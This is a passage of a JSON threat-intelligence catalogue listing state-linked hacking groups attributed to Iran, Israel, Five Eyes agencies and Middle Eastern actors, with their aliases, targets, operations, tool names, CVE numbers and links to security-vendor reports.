["https://www.fireeye.com/blog/threat-research/2018/10/apt38-details-on-new-north-korean-regime-backed-threat-group.html"], "attck_id": null, "comment": null}]}}, {"iran": {"actors": [{"names": ["Cutting Kitten", "TG-2889", "Ghambar", "COBALT GYPSY", "Cutting Kitten"], "targets": "This threat actor targets governments and private sector entities for espionage and sabotage purposes. It is believed to be responsible for compromising U.S. Navy computers at the Navy Marine Corps Intranet in San Diego, the U.S. energy company Calpine Corporation, Saudi Aramco, Pemex, Qatar Airways, and Korean Air", "operations": ["Cleaver"], "description": null, "tools": ["TinyZBot", "PupyRAT"], "links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles/", "https://cdn2.hubspot.net/hubfs/270968/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf", "https://www.secureworks.com/research/the-curious-case-of-mia-ash"], "attck_id": "G0059", "comment": "COBALT GYPSY overlap with OilRig"}, {"names": ["Shamoon", "Volatile Kitten"], "targets": "This threat actor targets energy sector, oil and gas industry as well as transportation and telecommunication services.", "operations": [], "description": "wiper", "tools": ["Shamoon / Disttrack"], "links": ["https://en.wikipedia.org/wiki/Shamoon", "http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html"], "attck_id": "S0140", "comment": null}, {"names": ["Clever Kitten", "Clever Kitten", "Group 41"], "targets": null, "operations": [], "description": null, "tools": ["Acunetix Web Vulnerability Scanner", "PHP Webshell RC SHELL"], "links": ["http://www.crowdstrike.com/blog/whois-clever-kitten/"], "attck_id": null, "comment": null}, {"names": ["Madi"], "targets": "This threat actor compromises engineering firms, government entities, and financial and academic institutions in the United States, Israel, Iran, and Pakistan", "operations": [], "description": "Social engineering", "tools": [], "links": ["https://securelist.com/blog/incidents/33693/the-madi-campaign-part-i-5/", "https://securelist.com/blog/incidents/33701/the-madi-campaign-part-ii-53/"], "attck_id": null, "comment": null}, {"names": ["Cyber fighters of Izz Ad-Din Al Qassam", "Fraternal Jackal"], "targets": "The websites of Bank of America, JPMorgan Chase, Wells Fargo, and other U.S. financial institutions suffered simultaneous outages due to a coordinated denial of service cyberattack in September 2012. Attackers flooded bank servers with junk traffic, preventing users from online banking. An Iranian group called Izz ad-Din al-Qassam Cyber Fighters initially claimed responsibility for the incident. At the time, the media reported that U.S. intelligence believed the denial of service was in response to U.S. imposed economic sanctions to counter Iran's nuclear program. Seven Iranian individuals linked to the Islamic Revolutionary Guard Corps were eventually indicted by the U.S. Department of Justice in 2016 for their involvement in the incident.", "operations": ["Ababil / ApAbabil"], "description": "DoS", "tools": [], "links": ["http://pastebin.com/u/QassamCyberFighters", "http://ddanchev.blogspot.com.es/2012/09/dissecting-operation-ababil-osint.html", "http://www.nytimes.com/2013/01/09/technology/online-banking-attacks-were-work-of-iran-us-officials-say.html", "https://www.washingtonpost.com/world/national-security/iran-blamed-for-cyberattacks/2012/09/21/afbe2be4-0412-11e2-9b24-ff730c7f6312_story.html"], "attck_id": null, "comment": null}, {"names": ["Chafer", "Cadelle", "ITG07", "APT39", "Remix Kitten"], "targets": "Airlines, Airports, Transportation, Logistics - worldwide", "operations": [], "description": null, "tools": ["Remexi", "PsExec", "Mimikatz", "Web Shells (aspx spy", "b374k)", "nbtscan", "plink", "RemCom", "VNC Bypass scanner", "CoreSecurity tools", "Impacket / Python exploits", "NSSM", "Remcom", "HTTPTunnel", "Cadelspy", "PLink", "SSH Tunnels to Windows Servers"], "links": ["http://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets", "https://www.symantec.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions", "http://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets", "https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html", "https://securelist.com/chafer-used-remexi-malware/89538/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/", "https://unit42.paloaltonetworks.com/new-python-based-payload-mechaflounder-used-by-chafer/", "https://securityintelligence.com/posts/observations-of-itg07-cyber-operations/"], "attck_id": "G0087", "comment": "Uses the same C2 infrastructure as OilRig"}, {"names": ["Prince of Persia"], "targets": "This threat actor targets governments and businesses of multiple countries, including the United States, Israel, and Denmark.", "operations": [], "description": null, "tools": ["Infy"], "links": ["https://iranthreats.github.io/", "http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/", "https://researchcenter.paloaltonetworks.com/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/", "https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/"], "attck_id": null, "comment": null}, {"names": ["Sima"], "targets": "focus on dissidents, woman rights activists, human rights organizations ", "operations": [], "description": null, "tools": [], "links": ["https://iranthreats.github.io/"], "attck_id": null, "comment": null}, {"names": ["Oilrig", "COBALT GYPSY", "Twisted Kitten", "Crambus", "ITG13", "Chrysene", "APT34", "Helix Kitten"], "targets": null, "operations": [], "description": null, "tools": ["Helminth", "ISMDoor", "Clayslide", "QUADAGENT", "OopsIE", "ALMA Communicator", "customized Mimikatz", "Invoke-Obfuscation", "POWBAT", "POWRUNER (PS Backdoor)", "BONDUPDATER", "malicious RTF files CVE-2017-0199 and CVE-2017-11882", "ELVENDOOR", "PLink", "PsExec", "SSH Tunnels to Windows Servers", "Webshells (TwoFace", "DarkSeaGreenShell", "LittleFace)", "PowDesk"], "links": ["https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html", "http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/", "http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/", "http://www.clearskysec.com/oilrig/", "https://cert.gov.il/Updates/Alerts/SiteAssets/CERT-IL-ALERT-W-120.pdf", "http://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/", "http://blog.morphisec.com/iranian-fileless-cyberattack-on-israel-word-vulnerability%20", "https://www.forbes.com/sites/thomasbrewster/2017/02/15/oilrig-iran-hackers-cyberespionage-us-turkey-saudi-arabia/#56749aa2468a", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-twoface-webshell-persistent-access-point-lateral-movement/", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/", "https://researchcenter.paloaltonetworks.com/2017/09/unit42-striking-oil-closer-look-adversary-infrastructure/", "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html", "https://researchcenter.paloaltonetworks.com/2017/12/unit42-introducing-the-adversary-playbook-first-up-oilrig/", "https://www.dragos.com/blog/20180517Chrysene.html", "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf", "https://sec0wn.blogspot.com/2018/05/prb-backdoor-fully-loaded-powershell.html", "https://www.ncsc.gov.uk/news/turla-group-exploits-iran-apt-to-expand-coverage-of-victims", "https://securityintelligence.com/posts/new-destructive-wiper-zerocleare-targets-energy-sector-in-the-middle-east/", "https://www.clearskysec.com/powdesk-apt34/"], "attck_id": "G0049", "comment": "Uses the same C2 infrastructure as Chafer - which caused a major mixup of OilRig campaigns falsely attributed to Chafer. Also note that Turla used OilRigs implants"}, {"names": ["CopyKittens", "Slayer Kitten", "DarkHydrus", "LazyMeerkat"], "targets": "Israel\u00e2\u0080\u0099s Ministry of Foreign Affairs and some well-known Israeli academic researchers specializing in Middle East Studies. Israel, Saudi Arabia, United States, Jordan, Germany", "operations": ["Wilted Tulip"], "description": null, "tools": ["TDTESS backdoor", "Vminst", "NetSrv", "Cobalt Strike", "ZPP", "Matryoshka v1 and Matryoshka v2"], "links": ["https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf", "https://blog.domaintools.com/2017/03/hunt-case-study-hunting-campaign-indicators-on-privacy-protected-attack-infrastructure/", "http://www.clearskysec.com/copykitten-jpost/", "http://www.clearskysec.com/tulip/", "https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/"], "attck_id": "G0052", "comment": "DarkHydrus C2 Infra Overlap"}, {"names": ["Charming Kitten", "Parastoo", "iKittens", "NEWSCASTER", "NewsBeef", "Phosphorus", "APT35", "Charming Kitten", "Group 83"], "targets": "This threat actor uses watering hole attacks and fake profiles to lure targets from the U.S. government for espionage purposes.", "operations": [], "description": "Fake Social Media Account ", "tools": ["ALFA TEaM Shell", "DROPSHOT", "TURNEDUP", "SHAPESHIFT", "malicious HTA files", "MacDownloader"], "links": ["https://iranthreats.github.io/resources/macdownloader-macos-malware/", "https://www.isightpartners.com/2014/05/newscaster-iranian-threat-inside-social-media/", "https://github.com/gasgas4/APT_CyberCriminal_Campagin/tree/master/2014/2014.05.28.NewsCaster_An_Iranian_Threat_Within_Social_Networks", "https://www.verfassungsschutz.de/download/broschuere-2016-10-bfv-cyber-brief-2016-04.pdf", "https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/", "https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf", "https://cryptome.org/2012/11/parastoo-hacks-iaea.htm", "https://www.forbes.com/sites/thomasbrewster/2017/07/27/iran-hackers-oilrig-use-fake-personas-on-facebook-linkedin-for-cyberespionage/", "http://www.clearskysec.com/charmingkitten/", "https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf", "https://noticeofpleadings.com/phosphorus/files/Sealing.pdf?fbclid=IwAR1HMnynb0AaGyCI-8ejHjH-pNORfuHYOzQdsTrSpin2eRww6rRh-6VK2SI", "https://securelist.com/twas-the-night-before/91599/", "https://www.clearskysec.com/wp-content/uploads/2019/09/The-Kittens-Are-Back-in-Town-Charming-Kitten-2019.pdf", "https://blogs.microsoft.com/on-the-issues/2019/10/04/recent-cyberattacks-require-us-all-to-be-vigilant/", "https://www.clearskysec.com/the-kittens-are-back-in-town-2/"], "attck_id": null, "comment": null}, {"names": ["Greenbug "], "targets": "Saudi Arabia", "operations": [], "description": null, "tools": ["ISMdoor"], "links": ["https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/", "https://www.arbornetworks.com/blog/asert/greenbugs-dns-isms/", "https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/february/ism-rat/", "http://www.clearskysec.com/ismagent/"], "attck_id": null, "comment": "Sub group of APT34 according to Mandiant"}, {"names": ["Magic Hound", "Timberworm", "MAGNALLIUM", "Elfin", "Refined Kitten", "Holmium", "APT33"], "targets": "A threat actor used malware known as Shamoon 2.0 to exfiltrate and delete data from computers in the Saudi transportation sector. Commercial entities, Middle East, US, South Korea, DND focussed entities, Airlines, Airline suppliers. ", "operations": ["Stonedrill/ Shamoon2.0"], "description": null, "tools": ["Shamoon", "POWERTON", "Ruler", "PUPYRAT", "POSHC2 (.NET backdoor)", "TURNEDUP", "AutoIt backdoor", "Gpppassword", "LaZagne", "Quasar RAT", "Remcos", "SniffPass", "DarkComet", "AutoIt FTP tool", ".NET FTP tool", "PowerShell downloader (registry.ps1)", "POSHC2 backdoor", "different keyloggers"], "links": ["http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/", "https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/", "https://www.symantec.com/connect/blogs/shamoon-multi-staged-destructive-attacks-limited-specific-targets", "https://www.fireeye.com/current-threats/annual-threat-report/mtrends.html", "https://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/", "https://webcache.googleusercontent.com/search?q=cache:Dicnr9-eKKYJ:https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf+&cd=6&hl=en&ct=clnk&gl=ie", "https://gallery.logrhythm.com/threat-intelligence-reports/shamoon-2-malware-analysis-logrhythm-labs-threat-intelligence-report.pdf", "https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/", "https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html", "https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage", "https://www.securityweek.com/iranian-hackers-caused-losses-hundreds-millions-report", "https://go.recordedfuture.com/hubfs/reports/cta-2019-0626.pdf", "https://www.wired.com/story/iran-apt33-industrial-control-systems/", "https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/"], "attck_id": "G0059", "comment": "possibly associated with Rocket Kitten and Cobalt Gypsy, Sandcat, use Recruitment themes"}, {"names": ["Rocket Kitten", "Flying Kitten", "TEMP.Beanie", "Saffron Rose", "Ajax Security Team", "Rocket Kitten", "Group 26"], "targets": "Saudi Arabia, Israel, US, Iran, high ranking defense officials, embassies of various target countries, notable Iran researchers, human rights activists, media and journalists, academic institutions and various scholars, including scientists in the fields of physics and nuclear sciences. It seeks out material related to diplomacy, defense, security, journalism, and human rights for espionage purposes.", "operations": ["Woolen Goldfish", "Thamar Reservoir"], "description": null, "tools": ["GHOLE / Core Impact", "CWoolger", "FireMalv", ".NETWoolger", "MPK", "Open source tools", "Puppy RAT", "MagicHound.Leash (IRC Bot)"], "links": ["https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-woolen-goldfish-when-kittens-go-phishing", "https://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-the-spy-kittens-are-back.pdf", "http://www.clearskysec.com/thamar-reservoir/", "https://citizenlab.org/2015/08/iran_two_factor_phishing/", "https://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf", "http://www.crowdstrike.com/blog/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten/", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2014/july/a-new-flying-kitten/", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-operation-saffron-rose.pdf"], "attck_id": "G0059", "comment": null}, {"names": ["?"], "targets": "This threat actor is based in the Middle East (possibly Iran) and targets English- and Persian-language organizations. It is alleged to be the same group behind a compromise of the Danish Ministry of Foreign Affairs.", "operations": ["Mermaid"], "description": null, "tools": [], "links": ["https://ti.360.com/upload/report/file/mryxdgkb20160707en.pdf"], "attck_id": null, "comment": null}, {"names": ["ITSecTeam"], "targets": "One of the threat actors responsible for the denial of service attacks against U.S in 2012/2013. Three individuals associated with the group believed to be have been working on behalf of Iran's Islamic Revolutionary Guard Corps were indicted by the Justice Department in 2016.", "operations": [], "description": null, "tools": [], "links": ["http://pastebin.com/mCHia4W5", "http://www.nytimes.com/2013/01/09/technology/online-banking-attacks-were-work-of-iran-us-officials-say.html", "https://www.washingtonpost.com/world/national-security/iran-blamed-for-cyberattacks/2012/09/21/afbe2be4-0412-11e2-9b24-ff730c7f6312_story.html"], "attck_id": "G0059", "comment": null}, {"names": ["MuddyWater", "TEMP.Zagros", "Seedworm", "Cobalt Ulster", "SectorD02", "Static Kitten"], "targets": "individuals in Asia and the Middle East, government and defense entities in Central and Southwest Asia", "operations": ["BlackWater"], "description": null, "tools": ["POWERSTATS", "PoweMuddy", "LaZagne", "Crackmapexec"], "links": ["https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/", "https://sec0wn.blogspot.co.il/2018/03/a-quick-dip-into-muddywaters-recent.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia/", "https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html", "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group", "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf", "https://sec0wn.blogspot.com/2018/02/burping-on-muddywater.html", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://threatrecon.nshc.net/2019/03/07/sectord02-powershell-backdoor-analysis/", "https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/", "https://documents.trendmicro.com/assets/white_papers/wp_new_muddywater_findings_uncovered.pdf", "https://www.clearskysec.com/wp-content/uploads/2019/06/Clearsky-Iranian-APT-group-%E2%80%98MuddyWater%E2%80%99-Adds-Exploits-to-Their-Arsenal.pdf", "https://securelist.com/muddywaters-arsenal/90659/", "https://blog.prevailion.com/2020/01/summer-mirage.html", "https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions"], "attck_id": "G0069", "comment": "Struggle with Kaspersky "}, {"names": ["Mabna Institute", "Silent Librarian", "TA407", "Cobalt Dickens"], "targets": "144 universities in the United States, 176 foreign universities in 21 countries, five federal and state government agencies in the United States, 36 private companies in the United States, 11 foreign private companies, and two international non-governmental organizations", "operations": [], "description": null, "tools": [], "links": ["https://www.fbi.gov/wanted/cyber/iranian-mabna-hackers", "https://info.phishlabs.com/blog/silent-librarian-more-to-the-story-of-the-iranian-mabna-institute-indictment", "https://twitter.com/ClearskySec/status/977899578346430464", "https://www.secureworks.com/blog/back-to-school-cobalt-dickens-targets-universities", "https://www.proofpoint.com/us/threat-insight/post/seems-phishy-back-school-lures-target-university-students-and-staff", "https://www.secureworks.com/blog/cobalt-dickens-goes-back-to-school-again", "https://www.bleepingcomputer.com/news/security/iranian-hackers-create-credible-phishing-to-steal-library-access/"], "attck_id": null, "comment": null}, {"names": ["DarkHydrus "], "targets": null, "operations": [], "description": null, "tools": ["RogueRobin"], "links": ["https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/", "https://docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc/edit#heading=h.ez428aw98bca"], "attck_id": "G0079", "comment": null}, {"names": ["Domestic Kitten", "Domestic Kitten"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/"], "attck_id": null, "comment": null}, {"names": ["Flash Kitten", "Raspite", "Leafminer", "Flash Kitten"], "targets": "MENA Region", "operations": [], "description": null, "tools": ["Sorgu", "guester / Trojan.Imecab"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.symantec.com/blogs/threat-intelligence/leafminer-espionage-middle-east", "https://www.dragos.com/blog/20180802Raspite.html"], "attck_id": "G0077", "comment": "long-running SWC campaigns from December 2016 until public disclosure in July 2018"}, {"names": ["Gold lowell", "Boss Spider"], "targets": null, "operations": [], "description": null, "tools": ["SamSam"], "links": ["https://www.secureworks.com/research/samsam-ransomware-campaigns", "https://www.crowdstrike.com/blog/an-in-depth-analysis-of-samsam-ransomware-and-boss-spider/", "https://www.justice.gov/opa/pr/two-iranian-men-indicted-deploying-ransomware-extort-hospitals-municipalities-and-public", "https://garwarner.blogspot.com/2018/11/two-iranian-hackers-charged-with-6.html"], "attck_id": null, "comment": "Criminal"}, {"names": ["Iridium"], "targets": null, "operations": ["Australian Parliament Hack", "Citrix Hack"], "description": null, "tools": ["China Chopper / Ckife Webshells", "LazyCat", "reGeorge"], "links": ["https://www.scmagazine.com/home/security-news/apts-cyberespionage/iridium-cyberespionage-gang-behind-aussie-parliament-attacks/", "https://www.zdnet.com/article/citrix-discloses-security-breach-of-internal-network/", "https://www.forbes.com/sites/kateoflahertyuk/2019/03/15/who-is-resecurity-the-firm-that-named-the-iranian-group-allegedly-behind-the-citrix-hack/", "https://www.wsj.com/articles/iran-blamed-for-cyberattack-on-australias-parliament-11550736796"], "attck_id": null, "comment": "NOTHING CONFIRMED YET"}, {"names": ["DNSpionage"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html", "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html", "https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/", "https://blog-cert.opmd.fr/dnspionage-retour-factuel-sur-les-attaques-annoncees-dans-differents-medias/"], "attck_id": null, "comment": null}, {"names": ["Tortoiseshell", "APT35", "Imperial Kitten"], "targets": "IT providers in Saudi Arabia", "operations": [], "description": null, "tools": ["Backdoor.Syskit", "Poison Frog", "Infostealer/Sha.exe/Sha432.exe", "Infostealer/stereoversioncontrol.exe", "get-logon-history.ps1"], "links": ["https://www.symantec.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain", "https://www.cyberscoop.com/saudi-arabia-hackers-it-providers-symantec/", "https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html"], "attck_id": "G0059", "comment": "Inconclusive link to OilRig/APT34"}, {"names": ["?"], "targets": "Oil companies in the middle east", "operations": ["Bapco Attack"], "description": null, "tools": ["Zerocleare", "DUSTMAN"], "links": ["https://www.ibm.com/downloads/cas/OAJ4VZNJ?_ga=2.162718588.1703640646.1575470035-355468858.1568634484&cm_mc_uid=62832336079115590460108&cm_mc_sid_50200000=12616311575470030712", "https://www.wired.com/story/iran-soleimani-cyberattack-hackers/"], "attck_id": null, "comment": null}, {"names": ["Fox Kitten", "Parasite"], "targets": null, "operations": [], "description": null, "tools": ["SSHNET", "Juicy Potato", "Port", "STSRCHECK", "LPManager", "Invoke-SMBClient", "Invoke-SMBEnum", "Invoke-SMBExec", "Invoke-TheHash", "Invoke-WMIExec", "SOCKET-Based Backdoor", "Ngrok"], "links": ["https://www.clearskysec.com/fox-kitten/", "https://dragos.com/blog/industry-news/the-state-of-threats-to-electric-entities-in-north-america/"], "attck_id": null, "comment": "Overlaps with APT33, APT34 and Chafer"}]}}, {"israel": {"actors": [{"names": ["Unit 8200"], "targets": "Directed at Iranian nuclear facilities", "operations": ["Olympic Games / Stuxnet"], "description": "Stuxnet is typically introduced to the target environment via an infected USB flash drive.", "tools": ["Stuxnet"], "links": ["http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf ", "https://archive.org/details/Stuxnet"], "attck_id": null, "comment": null}, {"names": ["Unit 8200", "Duqu Group"], "targets": "A threat actor, using a tool dubbed Duqu 2.0, targeted individuals and companies linked to the P5+1 (the five permanent member states of the UN Security Council, plus Germany), which was conducting negotiations on Iran's nuclear program. ", "operations": ["Duqu 2.0"], "description": null, "tools": ["Duqu"], "links": ["https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/", "https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf", "http://www.wsj.com/articles/spy-virus-linked-to-israel-targeted-hotels-used-for-iran-nuclear-talks-1433937601", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/"], "attck_id": null, "comment": null}, {"names": ["SunFlower", "MoonFlower", "Cheshire Cat", "Flowershop"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/", "https://github.com/Yara-Rules/rules/blob/master/malware/APT_CheshireCat.yar", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/"], "attck_id": null, "comment": "Might be related to Duqu, Stuxnetand might attributed to Israel."}]}}, {"nato": {"actors": [{"names": ["GOSSIPGIRL"], "targets": null, "operations": ["Olympic Games / Stuxnet"], "description": null, "tools": ["Flame", "Stuxnet", "Miniflame", "Duqu", "Gauss"], "links": ["https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"], "attck_id": null, "comment": "Collaborative umbrella of varioius threat actors"}, {"names": ["Equation Group", "Tilded Team", "EQGRP", "Housefly", "Remsec", "Longhorn", "Lamberts"], "targets": null, "operations": ["Socialist", "Olympic Games / Stuxnet", "Project Sauron / Strider"], "description": null, "tools": ["Regin", "EquationLaser", "EquationDrug", "DoubleFantasy", "TripleFantasy", "Fanny", "Grayfish", "RemSec", "Gauss"], "links": ["http://securelist.com/blog/research/67741/regin-nation-state-ownage-of-gsm-networks/", "https://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/", "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets", "https://securelist.com/analysis/publications/75533/faq-the-projectsauron-apt/", "https://www.bleepingcomputer.com/news/security/longhorn-cyber-espionage-group-is-actually-the-cia/", "https://web.archive.org/web/20160304022846/http://www.kaspersky.com/about/news/virus/2012/Kaspersky_Lab_and_ITU_Discover_Gauss_A_New_Complex_Cyber_Threat_Designed_to_Monitor_Online_Banking_Accounts", "https://twitter.com/RedDrip7/status/1178511323954434048", "https://securelist.com/darkuniverse-the-mysterious-apt-framework-27/94897/"], "attck_id": null, "comment": "NSA, GCHQ, CSIS, ASIS, GCSB, FiveEyes, FVEY"}, {"names": ["Snowglobe", "Animal Farm"], "targets": null, "operations": [], "description": null, "tools": ["Babar", "Bunny", "Dino", "Casper", "Tafacalou", "NBot", "Chocopop"], "links": ["https://securelist.com/blog/research/69114/animals-in-the-apt-farm/", "https://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france", "http://www.cyphort.com/evilbunny-malware-instrumented-lua/", "http://www.cyphort.com/babar-suspected-nation-state-spyware-spotlight/", "https://blog.gdatasoftware.com/blog/article/babar-espionage-software-finally-found-and-put-under-the-microscope.html"], "attck_id": null, "comment": "Probably French origins"}, {"names": ["Slingshot"], "targets": "Kenya, Yemen, Libya, Afghanistan, Iraq, Tanzania, Jordan, Mauritius, Somalia, Democratic Republic of the Congo, Turkey, Sudan and United Arab Emirates", "operations": ["Mikrotik Router Compromise"], "description": null, "tools": ["Slingshot", "Cahnadr", "GollumApp", "SsCB", "ffproxy", "NeedleWatch", "Sfc2", "Minisling", "Spork downloader"], "links": ["https://securelist.com/apt-slingshot/84312/"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "single victim \u00e2\u0080\u0093 a diplomatic entity from a country in Central Asia", "operations": ["Project Tajmahal"], "description": null, "tools": ["full-blown spying framework consists of two packages named \u00e2\u0080\u0098Tokyo\u00e2\u0080\u0099 and \u00e2\u0080\u0098Yokohama"], "links": ["https://securelist.com/project-tajmahal/90240/"], "attck_id": null, "comment": null}, {"names": ["Sea Turtle"], "targets": "industries: Ministries of foreign affairs, Military organizations, Intelligence agencies, Prominent energy organizations in US, Libya, Egypt, Lebanon, UAE, Albania, Cyprus, Turkey, Iraq, Jordan, Syria, Armenia, Sweden", "operations": ["Sea Turtle"], "description": null, "tools": ["DNS hijacking", "CVE-2009-1151", "CVE-2014-6271", "CVE-2017-3881", "CVE-2017-6736", "CVE-2017-12617", "CVE-2018-0296", "CVE-2018-7600", "Drupalgeddon"], "links": ["https://blog.talosintelligence.com/2019/04/seaturtle.html", "https://blog.talosintelligence.com/2019/07/sea-turtle-keeps-on-swimming.html", "https://www.reuters.com/article/us-cyber-attack-hijack-exclusive/exclusive-hackers-acting-in-turkeys-interests-believed-to-be-behind-recent-cyberattacks-sources-idUSKBN1ZQ10X"], "attck_id": null, "comment": "Turkish threat group"}, {"names": ["APT-C-39"], "targets": "PRC", "operations": [], "description": null, "tools": ["Vault7"], "links": ["http://blogs.360.cn/post/APT-C-39_CIA_EN.html"], "attck_id": null, "comment": "CIA "}]}}, {"middle_east": {"actors": [{"names": ["Molerats", "Gaza cyber gang", "Gaza Hacker Team"], "targets": "Israel, Palestine, Egypt, Saudi Arabia, United Arab Emirates, Turkey, USA. (Targeted sectors include governmental and diplomatic institutions, including embassies; companies from the aerospace and defence Industries; financial institutions; journalists; software developers.)", "operations": ["Molerats", "DustySky", "TopHat"], "description": "targeted emails with malware. fake website with malicipretending to be a legitimate iOS management software, and linking to it in an online freelancing marketplace.", "tools": ["Poison Ivy", "DustySky", "NeD Worm", "Scote", "Don\u00e2\u0080\u0099t Kill My Cat (DKMC)", "RTFs Exploiting CVE-2017-0199"], "links": ["https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html", "http://www.clearskysec.com/dustysky/", "https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team", "http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html", "https://github.com/kbandla/APTnotes/raw/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf", "http://pwc.blogs.com/cyber_security_updates/2016/11/molerats-theres-more-to-the-naked-eye.html", "http://www.clearskysec.com/molerats-iec/", "https://securelist.com/gaza-cybergang-updated-2017-activity", "https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/", "https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37", "https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one"], "attck_id": null, "comment": null}, {"names": ["AridViper", "Desert Falcon", "APT-C-23", "Two-tailed Scorpion"], "targets": "Egypt, Palestine, Israel, Jordan, UAE,Israeli-based organizations in the government, transport/infrastructure, military, and academia. One organization based in 